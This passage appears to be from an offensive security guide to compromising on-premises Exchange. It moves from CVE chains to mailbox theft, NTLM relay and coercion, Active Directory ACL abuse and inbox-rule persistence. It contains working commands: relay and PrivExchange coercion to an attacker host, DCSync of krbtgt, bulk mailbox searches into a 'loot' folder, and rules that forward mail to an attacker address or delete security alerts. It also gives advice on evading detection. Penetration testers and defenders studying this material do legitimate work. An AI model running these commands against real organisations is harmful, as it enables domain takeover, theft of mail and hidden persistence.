On-premises Exchange has been the single most consequential mass-exploited enterprise product of the last decade. The bugs cluster into a small number of classes, and understanding the class matters more than memorising the CVE, because the class recurs.

**Class one: the frontend proxy trust boundary.** The frontend IIS site authenticates and then proxies to the backend site, asserting the user's identity. Any bug in the routing or assertion logic is a pre-authentication bypass.

**Class two: .NET deserialisation.** Exchange is a large ASP.NET application that deserialises attacker-influenced data in several places, most notably ViewState in ECP and the PowerShell remoting payload. Deserialisation in an IIS worker process running with high privilege is remote code execution as `SYSTEM` or as a highly privileged Exchange identity.

**Class three: server-side arbitrary file write.** Several Exchange configuration surfaces accept a filesystem or UNC path from an administrator: the OAB virtual directory's external URL, mailbox export destinations, logging paths. Any authenticated path to those settings is a webshell, because the web root is writable by the Exchange service.

**Class four: authentication and NTLM relay.** Covered separately below.

The named chains, with the mechanism of each component:

| Name | CVEs | Mechanism | Mass exploited |
| --- | --- | --- | --- |
| **CVE-2020-0688** | CVE-2020-0688 | Exchange shipped **static, identical ASP.NET `validationKey` and `decryptionKey` values in the ECP `web.config` across every installation** of a given version. Knowing the keys lets any authenticated user forge a valid signed `__VIEWSTATE`, which ECP deserialises, giving code execution as the ECP application pool identity. Authenticated, but any mailbox user will do | Yes, widely, for years after patch |
| **CVE-2018-8581** | CVE-2018-8581 | Exchange would authenticate outbound on request via EWS push subscriptions, and the resulting relayed authentication could be combined with Exchange's own impersonation capability to act as other users. An Exchange privilege escalation via the same coercion primitive later used by PrivExchange | Limited |
| **PrivExchange** | CVE-2019-0686, CVE-2019-0724 | Coerce Exchange to authenticate to an attacker URL via an EWS push subscription, relay that machine-account NTLM to LDAP on a DC, and use `Exchange Windows Permissions`' `WriteDacl` on the domain object to grant yourself DCSync. Detailed below | Yes |
| **ProxyLogon** | CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065 | 26855 is a **pre-authentication SSRF in the frontend**: a POST to a path treated as an unauthenticated static resource, carrying an `X-BEResource` cookie, is proxied to an arbitrary backend URL as a privileged identity. Chained with 27065 (or 26858), a **post-authentication arbitrary file write** reached by setting the OAB virtual directory's external URL to ASPX content and then invoking the OAB reset operation, giving a webshell. 26857 is an unrelated deserialisation in the Unified Messaging service. **The real chain is 26855 plus 27065** | Yes, at global scale (HAFNIUM and then everyone) |
| **ProxyOracle** | CVE-2021-31195, CVE-2021-31196 | A reflected XSS combined with a **padding oracle against the encryption of the OWA authentication cookies**, allowing recovery of the plaintext credentials from captured cookies. Requires victim interaction | No |
| **ProxyToken** | CVE-2021-33766 | A **delegated authentication misconfiguration**: a request bearing a `SecurityToken` cookie was forwarded by the frontend to the backend without the frontend having authenticated it, and the backend module that was supposed to validate it was not loaded. Result: unauthenticated modification of mailbox configuration, for example setting a forwarding rule | Limited |
| **ProxyShell** | CVE-2021-34473, CVE-2021-34523, CVE-2021-31207 | 34473 is a **pre-authentication path confusion**: the Autodiscover explicit-logon URL normalisation strips an attacker-controlled segment, so a request to an Autodiscover path is resolved to a different, privileged backend path, bypassing the ACL check. 34523 is an **elevation of privilege in the PowerShell backend**, which trusted an identity supplied in the request rather than deriving it. Together those give administrative remote PowerShell with no credential. 31207 is then a **post-authentication arbitrary file write**, reached through `New-MailboxExportRequest` writing a PST whose contents you control to a path in the web root | Yes, at global scale |
| **ProxyNotShell** | CVE-2022-41040, CVE-2022-41082 | 41040 is the same SSRF class as 26855 but **requires authentication as any mailbox user**. 41082 is a **deserialisation in Exchange PowerShell remoting** giving code execution. Microsoft's initial URL-rewrite mitigation was bypassed more than once before the patch shipped | Yes |
| **OWASSRF** | CVE-2022-41080, CVE-2022-41082 | The same RCE component (41082) reached through a **different SSRF entry point on the OWA frontend** (41080) rather than through Autodiscover, which is exactly why it bypassed the ProxyNotShell URL-rewrite mitigation. Patched systems were not affected; systems relying on the mitigation were. Used in Play ransomware intrusions | Yes |
| **CVE-2021-42321** | CVE-2021-42321 | Post-authentication remote code execution arising from **improper validation of cmdlet arguments** in Exchange, again resolving to deserialisation | Yes, opportunistically |
| **CVE-2024-21410** | CVE-2024-21410 | **NTLM relay to Exchange.** A coerced or captured NetNTLMv2 response relayed to an Exchange endpoint authenticates as the victim, because Extended Protection was not enforced. Shipped alongside the CU that enables Extended Protection by default | Yes |
| **CVE-2025-53786** | CVE-2025-53786 | **Hybrid deployment elevation of privilege.** On-premises Exchange and Exchange Online shared a single service principal, so an attacker with administrative access to the on-premises Exchange server could escalate into the cloud tenant across the shared identity, with limited audit separation. CISA issued **Emergency Directive ED 25-02** in August 2025. Remediated by the April 2025 hotfix plus migration to a **dedicated Exchange hybrid application** | Not observed exploited at disclosure; the class is high-value |

Two further items belong in this section.

**The Autodiscover backoff leak.** Outlook's Autodiscover implementation, on failing to find `autodiscover.$DOMAIN`, walks up the domain and eventually attempts `autodiscover.<tld>`. Guardicore demonstrated in 2021 that registering `autodiscover.<tld>` domains and serving a Basic authentication challenge harvested hundreds of thousands of domain credentials from clients that authenticated without verifying they were talking to their own organisation. This is a client-side protocol design issue rather than a server vulnerability, it is not fully fixed, and the offensive form of it (own or control a plausible Autodiscover name in a path the client will try) is still worth considering where you control DNS or can influence resolution, which links to the on-path material.

**The Emergency Mitigation Service.** From the September 2021 CU onward, Exchange 2016 and 2019 Mailbox servers install the **Exchange Emergency Mitigation service**, which polls `https://officeclient.microsoft.com/getexchangemitigations` hourly and applies Microsoft-authored IIS URL rewrite rules, service disablements and app pool recycles automatically. Operationally this matters in two directions: a target may have a mitigation applied that its build level does not imply, so test rather than infer; and the EM service is an hourly outbound HTTPS beacon from the Exchange server to a Microsoft endpoint, which is a plausible traffic pattern to hide alongside. It can be disabled by an administrator, and whether it is enabled is part of the `HealthChecker` output.

### Authenticated mailbox access and what to do with it

#### Reading a mailbox

Choose the protocol on the basis of what the organisation already uses, because your traffic should look like everyone else's.

| Protocol | Endpoint | Tooling | Notes |
| --- | --- | --- | --- |
| EWS | `/EWS/Exchange.asmx` | MailSniper, `exchangelib` (Python), EWSEditor (GUI), DavMail | The most capable and best-supported. Supports impersonation and delegate access explicitly |
| MAPI over HTTP | `/mapi/emsmdb` | Ruler, native Outlook, `exchanger.py` | Native Outlook transport. Blends in perfectly. Fewer tools |
| Outlook Anywhere (RPC over HTTP) | `/rpc/rpcproxy.dll` | Ruler | Legacy. Useful where MAPI/HTTP is disabled |
| ActiveSync | `/Microsoft-Server-ActiveSync` | Any mobile mail client, or scripted HTTP | Simple, Basic auth, rarely MFA-protected. Limited to mail and calendar shapes |
| IMAP / POP | 993 / 995 | Any mail client, `offlineimap`, `mbsync` | Only if enabled. Excellent for bulk retrieval of a single mailbox because the tooling is mature |
| Remote PowerShell | `/PowerShell` | `New-PSSession` | Not mailbox content, but everything administrative |
| Graph | Cloud only | GraphRunner, `msgraph` SDKs | Cloud mailboxes. See hybrid and cloud mail below |

For interactive triage, connecting a real mail client to the target mailbox is often the fastest route, and **DavMail** deserves a specific mention: it is a gateway that exposes an EWS mailbox as local IMAP, SMTP, LDAP and CalDAV, so you can point Thunderbird or `mbsync` at an Exchange mailbox you have credentials for and use ordinary mail tooling to search and archive it.

```powershell
# Search your own mailbox for the obvious things
Invoke-SelfSearch -Mailbox $USER@$DOMAIN -ExchHostname $TARGET -Terms "*password*","*credential*","*vpn*","*mfa*","*confidential*" -OutputCsv self.csv -CheckAttachments -DownloadDir .\loot
```

```python
# exchangelib is the right tool for anything scripted or repeatable
from exchangelib import Credentials, Account, Configuration, DELEGATE, IMPERSONATION

creds = Credentials(username=r"CORP\user", password="...")
config = Configuration(service_endpoint="https://TARGET/EWS/Exchange.asmx", credentials=creds)
acct = Account(primary_smtp_address="victim@corp.local", config=config,
               autodiscover=False, access_type=DELEGATE)

for item in acct.inbox.filter(subject__contains="invoice").order_by("-datetime_received")[:50]:
    print(item.datetime_received, item.sender.email_address, item.subject)
```

Switching `access_type` to `IMPERSONATION` is how you use `ApplicationImpersonation` rights, and it is a one-word change. That is worth dwelling on: the difference between "I can read my own mail" and "I can read every mailbox in the organisation" is one enumeration step and one parameter.

#### The delegation and permission model

Exchange has four distinct ways to give one identity access to another's mail, and they are stored in different places, audited differently, and survive different remediation actions. Knowing which is which is the difference between competent persistence and getting cleaned up on the first password reset.

| Mechanism | Cmdlet | Stored where | Grants |
| --- | --- | --- | --- |
| **Full mailbox access** | `Add-MailboxPermission -AccessRights FullAccess` | ACE in the mailbox's own security descriptor | Read, write, delete everything in the mailbox. Not the ability to send as the user |
| **Send As** | `Add-ADPermission -ExtendedRights "Send-As"` (on-premises), `Add-RecipientPermission` (cloud) | ACE on the AD object | Send mail that appears to originate from the user, indistinguishably |
| **Send on Behalf** | `Set-Mailbox -GrantSendOnBehalfTo` | `publicDelegates` on the AD object | Send mail marked "on behalf of". Visible to recipients |
| **Folder-level permission** | `Add-MailboxFolderPermission -AccessRights Reviewer\|Editor\|Owner` | ACE on the individual folder | Access to one folder. The quiet option |

The folder-level path is underused. `Add-MailboxFolderPermission -Identity victim:\Inbox -User $USER -AccessRights Reviewer` grants read access to one folder and does not appear in `Get-MailboxPermission` output, which is where a reviewer looks. Setting `-User Default` grants it to **everyone in the organisation**, which is a genuine finding to hunt for as well as a technique: an executive whose Inbox or Calendar has `Default` set above `AvailabilityOnly` is readable by any authenticated user, and this happens by accident constantly.

```powershell
# Enumerate who can read what. Run this broadly, it is read-only and quiet
Get-Mailbox -ResultSize Unlimited | Get-MailboxPermission |
  Where-Object { $_.AccessRights -match "FullAccess" -and -not $_.IsInherited -and $_.User -notlike "NT AUTHORITY\*" } |
  Select-Object Identity, User, AccessRights

# Folder-level grants that are too broad
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
  Get-MailboxFolderPermission -Identity "$($_.PrimarySmtpAddress):\Inbox" -ErrorAction SilentlyContinue |
    Where-Object { $_.User -match "Default|Anonymous" -and $_.AccessRights -notmatch "None|AvailabilityOnly" }
}

# Send As
Get-Mailbox -ResultSize Unlimited | Get-ADPermission |
  Where-Object { $_.ExtendedRights -like "*Send-As*" -and -not $_.IsInherited }
```

#### Impersonation, and the single over-privileged service account

**`ApplicationImpersonation`** is an RBAC role that permits its holder to make EWS calls in the security context of any mailbox within the role assignment's scope. It exists because integrations need it: archiving products, backup products, CRM connectors, migration tools, signature managers, room-booking systems, journaling appliances and analytics platforms all need to read and write mailboxes they do not own. The documented, vendor-recommended way to configure them is:

```powershell
# Unscoped. Every mailbox in the organisation, forever.
New-ManagementRoleAssignment -Name "SvcArchive-Impersonation" -Role ApplicationImpersonation -User svc_archive

# Scoped. What the vendor documentation says is optional and what nobody does.
New-ManagementRoleAssignment -Name "SvcArchive-Scoped" -Role ApplicationImpersonation -User svc_archive `
  -CustomRecipientWriteScope "ArchiveScope"
```

The unscoped form is the norm. So the practical reality on most engagements is that **a single service account, with a password that was set at installation, has never been rotated, is documented in a runbook on a file share, and is frequently also a local administrator on the application server, grants read and write access to every mailbox in the organisation**. Finding that account is often a faster route to total mail compromise than any vulnerability, and it is a much better finding to write up because it is architectural.

Where to look for it: `Get-ManagementRoleAssignment -Role ApplicationImpersonation`, service account naming conventions in LDAP, `servicePrincipalName` values on user accounts, application server configuration files, the same account appearing as an SMTP relay authenticator, and the mailbox permission enumeration above (many products use `FullAccess` on all mailboxes instead of impersonation, which is even easier to spot).

The parallel construct on the cloud side is an application permission such as `Mail.Read` or `full_access_as_app`, which is covered under hybrid and cloud mail below.

#### Searching across mailboxes

Three supported mechanisms, in descending order of how loud they are.

**Compliance and eDiscovery search.** The designed-for-purpose route, requiring the `Mailbox Search` role or membership of `Discovery Management`. On-premises this is `New-MailboxSearch` targeting a discovery mailbox; in the cloud and in newer on-premises builds it is the compliance search cmdlets.

```powershell
# On-premises: search across mailboxes into a discovery mailbox
New-MailboxSearch -Name "ops1" -SourceMailboxes user1,user2 `
  -SearchQuery 'subject:"wire transfer" OR body:"password"' `
  -TargetMailbox "Discovery Search Mailbox" -EstimateOnly:$false

# Compliance search, available on-premises and in the cloud
New-ComplianceSearch -Name "ops2" -ExchangeLocation All -ContentMatchQuery 'password AND vpn'
Start-ComplianceSearch -Identity "ops2"
Get-ComplianceSearch -Identity "ops2" | Select-Object Status, Items, Size
New-ComplianceSearchAction -SearchName "ops2" -Export
```

**`Search-Mailbox`.** The older, blunter cmdlet: search a mailbox, copy hits to a target mailbox folder, optionally delete them. **Retired in Exchange Online**, with the retirement process running from March 2024, but **still present on-premises**, where it remains the most convenient bulk-search primitive available.

```powershell
Search-Mailbox -Identity victim -SearchQuery 'attachment:*.kdbx OR subject:"password"' `
  -TargetMailbox $USER -TargetFolder "ops" -LogLevel Full
```

**Impersonated per-mailbox EWS search.** The route that does not require any compliance role, only impersonation or full access, and which iterates mailboxes yourself.

```powershell
Invoke-GlobalMailSearch -ImpersonationAccount svc_archive -ExchHostname $TARGET `
  -AdminUserName $DOMAIN\svc_archive -AdminPassword $PASS `
  -Terms "*password*","*wire transfer*","*.pem","*banking*" -OutputCsv global.csv `
  -CheckAttachments -DownloadDir .\loot
```

Note what `Invoke-GlobalMailSearch` does if you let it: it will **grant `ApplicationImpersonation` to the account you specify** and then use it. That is a directory write, it lands in the admin audit log with your name on it, and it is a change you must remember to remove. If you already have an account with the role, use it and do not create a new assignment.

#### Exporting mail, and the volume problem

The supported bulk export is `New-MailboxExportRequest`, which needs the `Mailbox Import Export` role and writes a PST to a UNC path that the Exchange Trusted Subsystem can write to.

```powershell
New-ManagementRoleAssignment -Role "Mailbox Import Export" -User $USER   # loud, and often necessary
New-MailboxExportRequest -Mailbox victim -FilePath "\\$TARGET\c$\temp\victim.pst"
Get-MailboxExportRequest | Get-MailboxExportRequestStatistics | Select-Object Name, Status, PercentComplete, BytesTransferred
```

Understand what you have just done. You created a persistent AD object representing the request, you assigned yourself a role that is deliberately unassigned by default, you wrote a multi-gigabyte file to disk on a production mail server, and you generated admin audit entries for all of it. This is the single loudest thing in this part. It is also the ProxyShell file-write primitive, which is why it is monitored.

The volume problem is the real constraint, and it is worth thinking about properly rather than discovering it at three in the morning. A single executive mailbox is routinely 20 to 100 GB. An organisation of five thousand people holds tens of terabytes of mail. You cannot exfiltrate it, you should not try, and even if you could you could not read it.

The approach that works:

1. **Enumerate before you extract.** Folder listings, item counts and mailbox sizes tell you where the content is. `Get-MailboxStatistics` and `Get-MailboxFolderStatistics` give you this at negligible cost.
2. **Search on metadata first.** Subject lines, sender and recipient addresses, dates and attachment names are a tiny fraction of the volume and answer most questions. Pull the metadata for the whole mailbox, analyse offline, then request the specific items you actually want.
3. **Search on terms and shapes, not on mailboxes.** Attachment extensions (`.kdbx`, `.pem`, `.ppk`, `.ovpn`, `.pfx`, `.rdp`, `.config`, `.sql`, `.pst`), subject patterns (password reset, credentials, wire, invoice, bank details, contract, acquisition), and internal system senders (the ticketing system, the password manager, the certificate authority, the VPN enrolment mailer).
4. **Take samples, evidence the rest.** For the report, a handful of representative items plus the search hit counts and the enumeration output proves the access far better than a terabyte of PST does, and it dramatically reduces the data-handling burden on both sides.
5. **Watch your egress.** A sustained multi-gigabyte outbound transfer from an internal host is a detection signal in its own right, entirely independently of Exchange telemetry.

### The relay and coercion angle

The mechanics of NTLM relay, the coercion families, and the relay-blocking controls (SMB signing, LDAP signing and channel binding, Extended Protection) are covered in full in the Coercion, Relay and Certificate Abuse section. What is specific to Exchange is worth stating separately because it was the highest-impact instance of the pattern.

#### Exchange as a coercion source: PrivExchange

**What it is.** Ask Exchange, over its own API, to authenticate outbound to a URL you choose. Relay that authentication to LDAP on a domain controller. Use the ACLs the relayed identity holds to grant yourself DCSync. One API call from any mailbox user to domain compromise.

**Why it works.** Exchange Web Services supports **push notification subscriptions**: a client asks Exchange to notify it, by HTTP callback, when something changes in a mailbox. The client supplies the callback URL. Exchange then makes an outbound HTTP request to that URL, and it authenticates that request using its own machine account, because the notification is sent by the server not by the client. Nothing in the design constrains the callback URL to anything sensible. Set the notification interval to something small and you get a reliable, repeating, attacker-timed authentication from the Exchange server's computer account, with no dependency on any user activity.

That authentication is an NTLM authentication over HTTP, which is not protected by SMB signing (it is not SMB) and which, absent Extended Protection, is not bound to the channel. Relay it to LDAP or LDAPS on a domain controller and you are authenticated as the Exchange server's machine account. That machine account is in `Exchange Trusted Subsystem`, which is in `Exchange Windows Permissions`, which holds `WriteDacl` on the domain object. So you write a DACL granting your own account the replication extended rights, and then you DCSync.

**Preconditions.** Any valid mailbox credential (to create the subscription). Network reachability from Exchange to your listener on the port you specify. An unpatched directory preparation state, so that `Exchange Windows Permissions` still holds the unrestricted `WriteDacl` on the domain object. LDAP signing not required, or LDAPS with channel binding not enforced, on the target DC. Extended Protection not enabled on the Exchange EWS endpoint.

```bash
# Relay listener, targeting LDAP, escalating a user you control
impacket-ntlmrelayx -t ldap://$DC --escalate-user $USER --no-wcf-server

# Coerce Exchange to authenticate to you
python3 privexchange.py -ah $ATTACKER -u $USER -p $PASS -d $DOMAIN $TARGET
```

```bash
# Then, with the granted rights
impacket-secretsdump -just-dc $DOMAIN/$USER:$PASS@$DC
```

**Verify it worked.** `ntlmrelayx` prints the relayed identity (an account ending in `$`) and the outcome of the ACL write. Confirm independently by reading back the domain object's DACL, or simply by attempting a DCSync of a single account.

```bash
bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC get object "DC=corp,DC=local" --resolve-sd | grep -i -A3 "$USER"
impacket-secretsdump -just-dc-user krbtgt $DOMAIN/$USER:$PASS@$DC
```

**What has changed.** All of the following, cumulatively, and any one of them can break the chain:

- `setup.exe /PrepareAD` from Exchange 2019 CU1, 2016 CU12 or 2013 CU22 or later restricts the `WriteDacl` ACE to Inherit Only on `user` and `inetOrgPerson`, removing the ability to rewrite the domain object's own DACL. The DCSync grant fails even though the relay succeeds.
- Extended Protection on the Exchange IIS endpoints, default from Exchange 2019 CU14 and in Subscription Edition, binds the authentication to the TLS channel, so the relay itself fails.
- LDAP signing and LDAP channel binding enforcement on domain controllers breaks the relay's target side.
- Setting `EWSMaxSubscriptions` to 0 in the applicable throttling policy removes the push subscription capability entirely, which was the original emergency mitigation.
- The February 2019 Exchange updates (CVE-2019-0686 and CVE-2019-0724) changed the push notification behaviour so that the coercion primitive no longer yields a usable machine-account authentication.

**Failure modes.** `ntlmrelayx` reports the relay succeeded but the ACL modification failed with `insufficientAccessRights`: the directory has been prepared by a patched setup, so the ACE no longer permits writing the domain DACL. Relay fails at the bind with `strongerAuthRequired`: LDAP signing is enforced, move to LDAPS, and if channel binding is also enforced this path is closed. Coercion produces no callback at all: EWS subscriptions are throttled to zero, egress from Exchange to your port is filtered, or Exchange cannot resolve your host. Callback arrives but authenticates as a *user* rather than the machine account: you are seeing your own subscription-creating credential reflected, not the server's identity, which means the notification path is patched.

**Current viability.** Low against patched, prepared, current Exchange. Non-zero and occasionally excellent against the long tail: an unsupported Exchange 2016 server in a forest prepared in 2015 is not a hypothetical, and the whole chain still works there. Always test whether the ACE is present before assuming it is not.

#### Exchange as a relay target

The mirror image. A coerced or captured NetNTLMv2 authentication from a user, relayed **to** Exchange, authenticates you as that user to Exchange and therefore to their mailbox. `CVE-2024-21410` is exactly this, and it was addressed by enabling Extended Protection by default rather than by changing any authentication logic, because there was nothing wrong with the logic: NTLM relay is a property of NTLM.

The chain is: coerce a user or a machine account (any of the coercion families in the Coercion, Relay and Certificate Abuse section), relay to `https://$TARGET/EWS/Exchange.asmx`, and use the resulting authenticated session to read mail, set a forwarding rule, or add a mailbox permission. `ExchangeRelayX` is the tool built specifically to present an OWA-like interface over a relayed NTLM session; `ntlmrelayx`'s HTTP attack modules cover the general case.

```bash
impacket-ntlmrelayx -t https://$TARGET/EWS/Exchange.asmx --no-wcf-server -smb2support
```

Also worth remembering: relaying an Exchange **machine account** to LDAP is useful even where the ACL escalation is patched, because a machine account authentication to LDAP still permits **resource-based constrained delegation** configuration and **shadow credential** writes against objects the account can modify. `Exchange Windows Permissions` retains `ForceChangePassword` on users and write access to group membership even after the domain-object ACE was restricted, so the relay is not worthless just because DCSync is off the table. See Exchange directory rights abuse below.

### Exchange directory rights abuse

This is the ACL family, and it is the part most worth doing carefully, because the answer is entirely environment-specific and the folklore is unreliable.

**What the Exchange groups can do to the directory.** In the shared and RBAC split permissions models, `Exchange Windows Permissions` and `Exchange Trusted Subsystem` hold a collection of ACEs across the domain that, taken together, are close to a delegated administration role. The ones that matter offensively:

| Right | Held by | On | Abuse |
| --- | --- | --- | --- |
| `WriteDacl` (originally on the domain NC head; now Inherit Only on `user` and `inetOrgPerson`) | `Exchange Windows Permissions` | Domain object, inherited to users | **Unpatched preparation:** grant yourself DCSync on the domain. **Patched preparation:** rewrite the DACL of any non-protected user object, which is `GenericAll` over that user by another route |
| `ForceChangePassword` (User-Force-Change-Password extended right) | `Exchange Windows Permissions` | User objects not protected by AdminSDHolder | Reset the password of any unprotected user. **Including service accounts** |
| Write `member` on groups | `Exchange Windows Permissions` | Groups not protected by AdminSDHolder | Add yourself to any unprotected group. Non-protected groups routinely confer local administrator, application administration, or database access |
| Write to the `Public-Information` property set | `Exchange Trusted Subsystem` | User objects with inheritance enabled | Contains `altSecurityIdentities` and (historically) `servicePrincipalName`. See below |
| Write `altSecurityIdentities` | `Exchange Trusted Subsystem` | User objects | **ESC14**: write an explicit certificate mapping onto a privileged user, then authenticate as them with a certificate you hold. Cross-reference the AD CS domain escalation material in the Coercion, Relay and Certificate Abuse section |
| Write `servicePrincipalName` | `Exchange Trusted Subsystem` | User objects | Targeted kerberoasting: add an SPN to a user, request a service ticket, crack offline, remove the SPN. **Blocked for computer objects by deny ACEs added in the 2019 permissions reduction** |
| `WriteDacl` on `DnsAdmins` | `Exchange Windows Permissions` | The `DnsAdmins` group | Historically a path to code execution on a DC via DNS server plugin loading. **Blocked by deny ACEs added in the 2019 update** |
| `WriteDacl` on AdminSDHolder for `group` | `Exchange Trusted Subsystem` | AdminSDHolder | Would have permitted rewriting the template DACL that protects privileged groups. **Removed outright by the 2019 update on Exchange 2016 and later** |

<!-- VERIFY: the exact composition of the Public-Information property set and which of its members remain writable by the Exchange groups on a current build. This has shifted with the permissions-reduction updates and with subsequent security updates; enumerate on the live target rather than trusting a table. -->

**The single most valuable target of the surviving rights.** AdminSDHolder protects members of the protected groups (Domain Admins, Enterprise Admins, Administrators, and the rest) by periodically resetting their DACLs, and it also strips inheritance from those objects, which is why `ForceChangePassword` from `Exchange Windows Permissions` does not reach a Domain Admin. But **AdminSDHolder does not protect service accounts that merely happen to hold dangerous rights**. The canonical example is the **Entra Connect AD DS connector account**, typically named `MSOL_` followed by twelve hex characters, which holds `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` on the domain so that it can synchronise password hashes to the tenant, and which is an ordinary unprotected user object. `ForceChangePassword` on that account is DCSync, in one step, with no ACL write on the domain object at all. Look for it every time.

Other unprotected high-value accounts with the same property: backup service accounts with `SeBackupPrivilege` via a GPO-assigned right, vulnerability scanner accounts with local administrator everywhere, SCCM and MSSQL service accounts (see the MSSQL and SCCM material earlier in this section), monitoring accounts, and any account someone once granted replication rights to for a migration and never removed.

**Organisation Management to Exchange Windows Permissions.** The other frequently cited route is that `Organization Management` holds write access to the DACL of the `Microsoft Exchange Security Groups` OU, and therefore to the groups within it, permitting a member of `Organization Management` to add themselves to `Exchange Windows Permissions` and inherit its directory rights. This is widely reported, and the underlying logic is sound (Organization Management is Exchange's own delegation root and must be able to manage the Exchange groups), but the exact ACE and its current state varies with preparation vintage. Enumerate it rather than asserting it. <!-- VERIFY: the exact ACE granting Organization Management control over the Microsoft Exchange Security Groups OU on a current, patched, freshly prepared forest. -->

**Enumerating the actual state.** Do this before you plan anything.

```bash
# The domain object's DACL, resolved. Look for the Exchange groups and what they hold.
bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC get object "DC=corp,DC=local" --resolve-sd \
  | grep -i -B2 -A6 -E "Exchange Windows Permissions|Exchange Trusted Subsystem"

# The Exchange groups' outbound rights against a specific user
bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC get writable --detail

# Membership chains
bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC get object "Exchange Windows Permissions" --attr member,memberOf
```

```powershell
# PowerView equivalent, for when you are on a Windows host
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs |
  Where-Object { $_.SecurityIdentifier -match (ConvertTo-SID "Exchange Windows Permissions") } |
  Select-Object ActiveDirectoryRights, ObjectAceType, InheritanceType, AceFlags
```

The specific thing you are looking for on the domain object ACE is whether the `WriteDacl` grant carries the **Inherit Only** flag. With it, the ACE does not apply to the domain object itself and the DCSync grant is dead. Without it, the original PrivExchange outcome is live.

**Finding these in a graph.** The BloodHound CE material in the Active Directory: Enumeration section covers collection and query construction in depth. The Exchange-specific queries are short:

```cypher
// Everything the Exchange groups can do, one hop, excluding membership
MATCH (g:Group)
WHERE g.name =~ '(?i)^(EXCHANGE WINDOWS PERMISSIONS|EXCHANGE TRUSTED SUBSYSTEM|ORGANIZATION MANAGEMENT|EXCHANGE SERVERS)@.*'
MATCH p = (g)-[r]->(n)
WHERE type(r) <> 'MemberOf'
RETURN p
```

```cypher
// Shortest paths from the Exchange groups into Tier Zero
MATCH (g:Group) WHERE g.name STARTS WITH 'EXCHANGE WINDOWS PERMISSIONS@'
MATCH (t:Base) WHERE 'admin_tier_0' IN t.system_tags
MATCH p = shortestPath((g)-[*1..]->(t))
RETURN p
```

```cypher
// Which unprotected accounts hold DCSync, and can the Exchange groups reach them
MATCH (n)-[:DCSync|AllExtendedRights]->(d:Domain)
MATCH (g:Group) WHERE g.name STARTS WITH 'EXCHANGE WINDOWS PERMISSIONS@'
MATCH p = shortestPath((g)-[*1..3]->(n))
RETURN p
```

<!-- VERIFY: the Tier Zero tag value in current BloodHound CE. It is exposed as a system-managed tag on the node rather than the legacy highvalue boolean; confirm the exact property and value against your instance. -->

**Detection and opsec for the ACL family.** An ACL write on the domain object generates event **5136** (directory service object modified) on the domain controller if directory service changes auditing is enabled, with the modified `nTSecurityDescriptor`. That is one of the highest-fidelity detections available to a defender and mature environments alert on it specifically. A password reset via `ForceChangePassword` generates **4724** (attempt to reset an account's password) which, from an Exchange machine account against a service account, is anomalous by construction. Group membership changes generate **4728**, **4732** and **4756**. Adding an SPN or writing `altSecurityIdentities` generates **5136** on the user object. If you take the ACL route, take it once, use it immediately, and remove what you added; leaving a DCSync grant in place is how a three-week-old engagement gets discovered.

**Impact framing.** The finding is not "Exchange has too many permissions", it is "the Active Directory forest was prepared by an Exchange version predating the permissions reduction and has never been re-prepared, therefore any compromise of the Exchange server tier is a compromise of the forest". The remediation is specific and cheap: run `setup.exe /PrepareAD` (and `/PrepareAllDomains`) from a current build, verify the resulting ACEs, and treat Exchange servers as Tier Zero assets until they are gone.

### Mail as a lateral movement and persistence channel

Mail is an unusually good persistence medium because the mechanisms are supported features, they are configured through the same interfaces administrators use daily, and several of them are completely independent of the compromised user's credentials.

#### Inbox rules

**What it is.** A server-side rule attached to a mailbox that acts on messages as they arrive. Created with `New-InboxRule`, evaluated by the Exchange store, and therefore independent of any client.

**Why it works.** Rules are a mailbox property, not a client setting. They run when mail arrives whether or not anyone is logged in, they follow the mailbox across clients and devices, and they survive an Outlook profile rebuild.

```powershell
# Silent copy of everything to an address you control
New-InboxRule -Mailbox victim -Name "Calendar Sync" -ForwardTo "ops@$ATTACKER" -StopProcessingRules $false

# Copy only the interesting things, and hide the evidence
New-InboxRule -Mailbox victim -Name "RSS Feeds" -SubjectOrBodyContainsWords "password","invoice","wire" `
  -ForwardAsAttachmentTo "ops@$ATTACKER" -MoveToFolder "victim:\RSS Subscriptions"

# Suppress security notifications so a password change alert never reaches the user
New-InboxRule -Mailbox victim -Name "Notifications" -From "security@$DOMAIN" -DeleteMessage $true
```

The third form matters more than it looks. A rule that deletes mail from the identity team, the MFA enrolment system, or the SOC's user-notification mailbox means the victim never learns their account was flagged. That is a lateral movement enabler, not just exfiltration.

**Naming.** Rules named plausibly and placed among the user's existing rules survive review. Rules named with a single character or left blank were a documented actor tradecraft that defenders now specifically hunt, because an empty rule name is anomalous.

#### Client-side triggers: rules, forms and the Outlook home page

The classic Ruler primitives, which are code execution on the *user's workstation* triggered by mail. These are Outlook-client mechanisms, not server mechanisms, and Microsoft has restricted all three.

| Primitive | Mechanism | State |
| --- | --- | --- |
| **Mail rule with a "start application" action** | A client-side rule whose action launches an executable at a WebDAV or UNC path. Ruler synchronises the rule into the mailbox, Outlook downloads and runs it on message arrival | Disabled by an Outlook security update. Re-enabled only by the registry value `EnableUnsafeClientMailRules` under the Outlook `Security` key, which some organisations set because a legacy workflow broke <!-- VERIFY: exact registry path per Office version --> |
| **Custom Outlook form** | A form definition stored in the mailbox containing script that Outlook executes when a message of the matching class is opened | Restricted by Outlook updates. Still worth testing on estates with old Office builds |
| **Outlook home page** | The `WebViewURL` property on a mailbox folder causes Outlook to render an attacker-controlled URL inside the client, executing script (CVE-2017-11774) | Patched and additionally restricted by registry policy. Effectively dead on current Office |

```bash
ruler --email victim@$DOMAIN --username $DOMAIN\\$USER --password $PASS --url https://$TARGET/autodiscover/autodiscover.xml display
ruler --email victim@$DOMAIN --username $DOMAIN\\$USER --password $PASS forms display
```

Treat this whole family as a configuration finding first (are the unsafe client rule actions re-enabled anywhere) and an execution primitive second. On a current, patched Office estate it is mostly dead. Ruler's `--brute` mode for credential spraying over MAPI and Autodiscover remains useful independently of the execution primitives.

#### Transport rules

**What it is.** An organisation-wide mail flow rule, evaluated in the transport pipeline, applying to every message that traverses the organisation. `New-TransportRule`. Requires an Exchange administrative role.

